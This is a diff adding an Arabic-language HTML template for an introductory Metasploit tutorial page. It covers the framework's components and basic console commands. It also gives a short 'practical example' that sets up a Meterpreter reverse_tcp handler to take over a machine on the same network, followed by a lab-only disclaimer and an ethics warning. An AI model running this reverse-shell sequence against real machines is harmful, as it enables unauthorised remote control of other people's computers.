@@ -1,0 +1,72 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<style>
+    .cmd-box { background: #0a0a0a; border-left: 5px solid #ffc107; padding: 15px; font-family: monospace; color: #00ff00; border-radius: 5px; margin: 15px 0; }
+    .info-box { background: #111; border: 1px solid #333; padding: 20px; border-radius: 5px; margin: 20px 0; }
+    .warning-box { background: #1a0a0a; border: 1px solid #ffc107; padding: 15px; border-radius: 5px; margin: 20px 0; }
+</style>
+
+<div class="card-dark p-4">
+    <h2 class="section-title"><i class="fas fa-skull"></i> Metasploit: الموسوعة الكاملة</h2>
+    
+    <div class="text-center mb-4">
+        <i class="fas fa-skull fs-1 text-warning"></i>
+    </div>
+
+    <h4 class="text-warning">1. ما هو Metasploit؟</h4>
+    <p>
+        <strong>Metasploit</strong> هو إطار عمل (Framework) مفتوح المصدر، يُستخدم لتطوير وتنفيذ هجمات الاختراق (Exploits) واختبار الثغرات الأمنية.
+        يعتبر <strong>الأداة الأولى</strong> للقراصنة الأخلاقيين ومختبرين الأمن السيبراني.
+    </p>
+
+    <h4 class="text-warning mt-4">2. أهم مكونات Metasploit</h4>
+    <div class="info-box">
+        <ul class="text-light">
+            <li><strong>Exploits:</strong> الأكواد التي تستغل الثغرات الأمنية.</li>
+            <li><strong>Payloads:</strong> الأكواد التي يتم تنفيذها بعد نجاح الاختراق (مثل Meterpreter).</li>
+            <li><strong>Encoders:</strong> أدوات لتشفير الحمولات لتجنب اكتشافها.</li>
+            <li><strong>Post Exploitation:</strong> أدوات للتحكم بالجهاز المخترق بعد الدخول.</li>
+        </ul>
+    </div>
+
+    <h4 class="text-warning mt-4">3. أوامر أساسية في Metasploit</h4>
+    
+    <div class="cmd-box">msfconsole</div>
+    <p><strong>وصف:</strong> هذا الأمر يفتح واجهة الأوامر الرئيسية لـ Metasploit.</p>
+
+    <div class="cmd-box">search [اسم_الثغرة]</div>
+    <p><strong>وصف:</strong> يبحث في قاعدة بيانات Metasploit عن ثغرة معينة.</p>
+
+    <div class="cmd-box">use [مسار_الاستغلال]</div>
+    <p><strong>وصف:</strong> يختار استغلال (Exploit) معين للعمل عليه.</p>
+
+    <div class="cmd-box">show options</div>
+    <p><strong>وصف:</strong> يعرض الخيارات المتاحة للاستغلال الحالي.</p>
+
+    <div class="cmd-box">exploit</div>
+    <p><strong>وصف:</strong> ينفذ الهجوم ويحاول اختراق الهدف.</p>
+<h4 class="text-warning mt-4">4. مثال عملي: اختراق جهاز</h4>
+    <p>
+        إليك تسلسل بسيط لاختراق جهاز على نفس الشبكة باستخدام Metasploit:
+    </p>
+    <div class="bg-black p-3 rounded border border-secondary" style="font-family: monospace; color: #00ff00;">
+        1. msfconsole<br>
+        2. use exploit/multi/handler<br>
+        3. set payload windows/meterpreter/reverse_tcp<br>
+        4. set LHOST [عنوان_IP_الخاص_بك]<br>
+        5. set LPORT 4444<br>
+        6. exploit
+    </div>
+    <p class="mt-2 text-secondary small">* هذا مثال تعليمي فقط. يجب استخدامه في بيئة معملية آمنة.</p>
+
+    <div class="warning-box mt-4">
+        <h5 class="text-warning"><i class="fas fa-gavel"></i> تنبيه أخلاقي</h5>
+        <p>
+            Metasploit هو أداة قوية جداً. استخدامها لاختراق أجهزة لا تملكها <strong>جريمة</strong> يعاقب عليها القانون.
+        </p>
+    </div>
+
+    <a href="/hacking_tools" class="btn btn-red mt-3"><i class="fas fa-arrow-left"></i> العودة لقاعة الأدوات</a>
+</div>
+{% endblock %}
